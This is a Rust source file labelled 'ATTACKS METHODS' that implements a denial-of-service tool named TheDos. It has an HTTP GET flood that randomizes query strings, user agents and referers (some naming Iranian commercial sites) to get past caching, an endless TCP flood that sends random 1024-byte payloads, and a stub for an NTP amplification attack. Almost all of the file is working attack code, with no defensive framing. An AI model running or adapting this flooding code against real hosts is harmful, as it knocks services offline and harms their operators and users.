









// ATTACKS METHODS







use crate::*;






#[derive(Clone, Debug, Default)]
pub struct TheDos{
    pub flag: u8,
    pub safe: u8,
    pub host: String,
    pub url: String,
    pub tcp_addr: String,
    pub udp_addr: String,
    pub retries: u128,
    pub status_code: u16,
}


impl TheDos{


    pub fn new(url: &str, tcp_addr: &str, udp_addr: &str, host: &str) -> Self{
        Self{
            flag: 0,
            safe: 0,
            host: host.to_string(),
            url: url.to_string(),
            tcp_addr: tcp_addr.to_string(),
            udp_addr: udp_addr.to_string(),
            retries: 0,
            status_code: 0,
        }
    }

}


pub fn gen_chars(size: u32) -> String{
    let mut rng = rand::thread_rng();
    (0..size).map(|_|{
        char::from_u32(rng.gen_range(65..91)).unwrap() // generating a char from the random output of type u32 using from_u32() method
    }).collect()
}


pub fn gen_random_number(from: u32, to: u32) -> u32{
    let mut rng = rand::thread_rng();
    rng.gen_range(from..to)
} 



impl TheDos{


    pub fn build_user_agents(&self) -> Vec<&'static str>{ // use 'static lifetime in order to be able to return &str from the function since rust doesn't allow to return reference by default unless the return type has a valid and defined lifetime
        let mut user_agents = Vec::<&str>::new();
        user_agents.push("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)");
        user_agents.push("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)");
        user_agents.push("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
        
        user_agents
    
    }

    pub fn monitor_attack(&self){
        let mut last_try = self.retries;
        while self.flag == 0{
            if last_try + 100 < self.retries && last_try != self.retries{
                info!("request sent {}", self.retries);
                last_try = self.retries;
            }
            if self.flag == 2{
                info!("-- TheDos Attack Finished --");
                process::exit(1);
            }
        }
    }

    
    pub fn headers_referers(&self) -> Vec<&str>{ // it's ok to return Vec<&str> since we're using the lifetime of the self
        let mut headers_referers = Vec::<&str>::new();
        headers_referers.push("http://snappfood.ir/");
        headers_referers.push("http://digikala.com/");
        headers_referers.push("http://arvancloud.com/");
        headers_referers.push(self.host.as_str());

        headers_referers

    }
    
    
    pub async fn httpcall(&mut self){ // url is &str thus we don't need to clone it since its sized
        
        let param_joiner = if self.url.as_str().matches("&").count() > 0{
            "&"
        } else{
            "?"
        };
        
        let referer = format!("{}{}", self.headers_referers()[gen_random_number(0, self.headers_referers().len() as u32 ) as usize], gen_chars(gen_random_number(5, 11)));
        let uri = format!("{}{}{}={}", self.url.as_str(), param_joiner, gen_chars(gen_random_number(3, 11)), gen_chars(gen_random_number(3, 11))).as_str().parse::<Uri>().unwrap();
        let client = Client::new();
        let req = Request::builder()
                                            .uri(&uri)
                                            .method("GET")
                                            .header("User-Agent", self.build_user_agents()[gen_random_number(0, self.build_user_agents().len() as u32 ) as usize])
                                            .header("Cache-Control", "no-cache")
                                            .header("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
                                            .header("Referer", referer.as_str())
                                            .header("Keep-Alive", gen_random_number(110, 120))
                                            .header("Connection", "keep-alive")
                                            .header("Host", self.host.as_str())
                                            .body(Body::from(""))
                                            .expect("failed to build the request");

        // 1) For each attack:
        //     - Spawn a new httpcall()
        //     - That task starts making non-blocking I/O calls
        //     - Those tasks go to sleep, to be rescheduled when data is ready
        // 2) Reach the end of the main function, which triggers the runtime to shut down
        // don't use block_on() cause we'll face ConnectError("dns error"... The problem is that we reach (2) long before we finish (1). 
        // When this happens, all in-flight I/O will be cancelled, which leads to the error messages we saw above. Instead, 
        // we need to ensure we wait for each task to complete before we exit. 
        // The easiest way to do this is to call .await on the result of the tokio::spawn call since in concurrency 
        // we don't need to be sequential thus we must have joinhanle tasks: https://www.fpcomplete.com/blog/http-status-codes-async-rust/
        // let res = block_on(client.request(req)).unwrap(); 
        
        info!("sending GET of {} to {}", uri, self.url);
        let res = client.request(req).await.unwrap();
        self.monitor_attack(); // Let Me Cry For You 
        
        if res.status() == 500{
            self.flag = 1;
            self.status_code = 500;
            process::exit(1);
        } else{
            self.retries+=1;
        }
        
    
    }
    
    
    pub async fn tcpcall(&mut self){

        let sleep = Duration::from_secs("3".to_string().parse::<u64>().unwrap());
        let mut time = self.retries;
    
        loop{

            time+=1;
            let tcp_addr = self.tcp_addr.clone();
            tokio::spawn(async move{ 
                match TcpStream::connect(tcp_addr).await{
                    Ok(mut stream) => {
    
                        info!("sending packet {}", time);
                        let random_bytes: Vec<u8> = (0..1024).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with size 1024 bytes
                        stream.write_all(&random_bytes).await.unwrap();
    
                    },
                    Err(e) => {
                        error!(": {}", e);
                    }
                }
            });  

            self.monitor_attack(); // Let Me Cry For You 

            thread::sleep(sleep);

            self.retries = time;
        }
    
    }
    
    
    pub async fn udpcall(){
        
        // ntp attack
        // tokio udp call
        // ...
    }



}

